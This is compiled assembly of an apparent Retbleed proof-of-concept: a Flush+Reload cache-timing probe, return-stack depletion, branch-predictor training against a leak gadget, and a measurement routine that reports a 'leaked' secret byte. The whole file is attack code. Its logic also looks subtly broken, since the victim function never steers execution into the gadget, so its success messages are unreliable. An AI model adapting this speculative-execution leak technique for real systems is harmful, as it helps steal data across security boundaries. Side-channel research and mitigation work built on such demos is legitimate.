	.file	"retbleed.c"
	.text
	.comm	probe_array,16384,32
	.globl	flush_probe_array
	.type	flush_probe_array, @function
flush_probe_array:
.LFB4262:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	$0, -12(%rbp)
	jmp	.L2
.L3:
	movl	-12(%rbp), %eax
	sall	$6, %eax
	cltq
	leaq	probe_array(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	clflush	(%rax)
	nop
	addl	$1, -12(%rbp)
.L2:
	cmpl	$255, -12(%rbp)
	jle	.L3
	mfence
	nop
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4262:
	.size	flush_probe_array, .-flush_probe_array
	.type	rdtsc, @function
rdtsc:
.LFB4263:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	rdtsc
	salq	$32, %rdx
	orq	%rdx, %rax
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4263:
	.size	rdtsc, .-rdtsc
	.globl	measure_access_time
	.type	measure_access_time, @function
measure_access_time:
.LFB4264:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$40, %rsp
	movq	%rdi, -40(%rbp)
	movl	$0, %eax
	call	rdtsc
	movq	%rax, -16(%rbp)
	movq	-40(%rbp), %rax
	movzbl	(%rax), %eax
	movb	%al, -17(%rbp)
	mfence
	nop
	movl	$0, %eax
	call	rdtsc
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	subq	-16(%rbp), %rax
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4264:
	.size	measure_access_time, .-measure_access_time
	.globl	benign_target
	.type	benign_target, @function
benign_target:
.LFB4265:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4265:
	.size	benign_target, .-benign_target
	.globl	common_init
	.type	common_init, @function
common_init:
.LFB4266:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movl	$16384, %edx
	movl	$0, %esi
	leaq	probe_array(%rip), %rdi
	call	memset@PLT
	movl	$0, -4(%rbp)
	jmp	.L11
.L12:
	movl	-4(%rbp), %eax
	cltq
	leaq	probe_array(%rip), %rdx
	movb	$1, (%rax,%rdx)
	addl	$64, -4(%rbp)
.L11:
	cmpl	$16383, -4(%rbp)
	jle	.L12
	mfence
	nop
	movl	$0, %eax
	call	flush_probe_array
	mfence
	nop
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4266:
	.size	common_init, .-common_init
	.section	.rodata
.LC0:
	.string	"Measuring cache timings..."
	.align 8
.LC1:
	.string	"Leaked %s (speculatively): %c (ASCII %d), Access Time: %lld cycles\n"
	.align 8
.LC2:
	.string	"SUCCESS! Leaked the actual %s.\n"
	.align 8
.LC3:
	.string	"LEAKED VALUE DOES NOT MATCH ACTUAL %s.\n"
	.align 8
.LC4:
	.string	"No %s leaked or could not detect leakage.\n"
	.text
	.globl	perform_measurement
	.type	perform_measurement, @function
perform_measurement:
.LFB4267:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$64, %rsp
	movl	%edi, %eax
	movq	%rsi, -64(%rbp)
	movb	%al, -52(%rbp)
	leaq	.LC0(%rip), %rdi
	call	puts@PLT
	movl	$-1, -36(%rbp)
	movq	$-1, -24(%rbp)
	movl	$50, -28(%rbp)
	movl	$0, -32(%rbp)
	jmp	.L14
.L17:
	movl	-32(%rbp), %eax
	sall	$6, %eax
	cltq
	leaq	probe_array(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rax
	movq	%rax, %rdi
	call	measure_access_time
	movq	%rax, -8(%rbp)
	movl	-28(%rbp), %eax
	cltq
	cmpq	%rax, -8(%rbp)
	jge	.L15
	cmpq	$-1, -24(%rbp)
	je	.L16
	movq	-8(%rbp), %rax
	cmpq	-24(%rbp), %rax
	jge	.L15
.L16:
	movq	-8(%rbp), %rax
	movq	%rax, -24(%rbp)
	movl	-32(%rbp), %eax
	movl	%eax, -36(%rbp)
.L15:
	addl	$1, -32(%rbp)
.L14:
	cmpl	$255, -32(%rbp)
	jle	.L17
	cmpl	$-1, -36(%rbp)
	je	.L18
	movl	-36(%rbp), %eax
	movsbl	%al, %edx
	movq	-24(%rbp), %rsi
	movl	-36(%rbp), %ecx
	movq	-64(%rbp), %rax
	movq	%rsi, %r8
	movq	%rax, %rsi
	leaq	.LC1(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movzbl	-52(%rbp), %eax
	cmpl	%eax, -36(%rbp)
	jne	.L19
	movq	-64(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC2(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$1, %eax
	jmp	.L20
.L19:
	movq	-64(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC3(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
	jmp	.L20
.L18:
	movq	-64(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC4(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
.L20:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4267:
	.size	perform_measurement, .-perform_measurement
	.globl	secret_retbleed_data
	.data
	.type	secret_retbleed_data, @object
	.size	secret_retbleed_data, 1
secret_retbleed_data:
	.byte	82
	.text
	.globl	leak_gadget_retbleed
	.type	leak_gadget_retbleed, @function
leak_gadget_retbleed:
.LFB4268:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	%edi, %eax
	movb	%al, -4(%rbp)
	movzbl	-4(%rbp), %eax
	sall	$6, %eax
	cltq
	leaq	probe_array(%rip), %rdx
	movb	$1, (%rax,%rdx)
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4268:
	.size	leak_gadget_retbleed, .-leak_gadget_retbleed
	.globl	deep_call_retbleed
	.type	deep_call_retbleed, @function
deep_call_retbleed:
.LFB4269:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movl	%edi, -4(%rbp)
	cmpl	$0, -4(%rbp)
	jle	.L24
	movl	-4(%rbp), %eax
	subl	$1, %eax
	movl	%eax, %edi
	call	deep_call_retbleed
.L24:
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4269:
	.size	deep_call_retbleed, .-deep_call_retbleed
	.globl	victim_function_with_return_retbleed
	.type	victim_function_with_return_retbleed, @function
victim_function_with_return_retbleed:
.LFB4270:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	%edi, %eax
	movb	%al, -20(%rbp)
	movl	$0, -8(%rbp)
	movl	$0, -4(%rbp)
	jmp	.L26
.L27:
	movl	-8(%rbp), %edx
	movl	-4(%rbp), %eax
	addl	%edx, %eax
	movl	%eax, -8(%rbp)
	addl	$1, -4(%rbp)
.L26:
	cmpl	$9, -4(%rbp)
	jle	.L27
	nop
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4270:
	.size	victim_function_with_return_retbleed, .-victim_function_with_return_retbleed
	.section	.rodata
	.align 8
.LC5:
	.string	"\n--- Running Retbleed Demo ---"
.LC6:
	.string	"Depleting RSB..."
	.align 8
.LC7:
	.string	"Training BTB/PHT for RET misdirection..."
	.align 8
.LC8:
	.string	"Triggering victim function with return..."
.LC9:
	.string	"Retbleed secret"
.LC10:
	.string	"Actual secret data: %c\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4271:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movl	$0, %eax
	call	common_init
	leaq	.LC5(%rip), %rdi
	call	puts@PLT
	leaq	.LC6(%rip), %rdi
	call	puts@PLT
	movl	$64, %edi
	call	deep_call_retbleed
	mfence
	nop
	leaq	.LC7(%rip), %rdi
	call	puts@PLT
	movl	$0, -12(%rbp)
	jmp	.L29
.L30:
	leaq	leak_gadget_retbleed(%rip), %rax
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	movl	$0, %edi
	call	*%rax
	mfence
	nop
	addl	$1, -12(%rbp)
.L29:
	cmpl	$4999, -12(%rbp)
	jle	.L30
	movl	$0, %eax
	call	flush_probe_array
	mfence
	nop
	movl	$0, %eax
	call	flush_probe_array
	lfence
	nop
	leaq	.LC8(%rip), %rdi
	call	puts@PLT
	movzbl	secret_retbleed_data(%rip), %eax
	movzbl	%al, %eax
	movl	%eax, %edi
	call	victim_function_with_return_retbleed
	lfence
	nop
	movzbl	secret_retbleed_data(%rip), %eax
	movzbl	%al, %eax
	leaq	.LC9(%rip), %rsi
	movl	%eax, %edi
	call	perform_measurement
	movzbl	secret_retbleed_data(%rip), %eax
	movzbl	%al, %eax
	movl	%eax, %esi
	leaq	.LC10(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4271:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	 1f - 0f
	.long	 4f - 1f
	.long	 5
0:
	.string	 "GNU"
1:
	.align 8
	.long	 0xc0000002
	.long	 3f - 2f
2:
	.long	 0x3
3:
	.align 8
4:
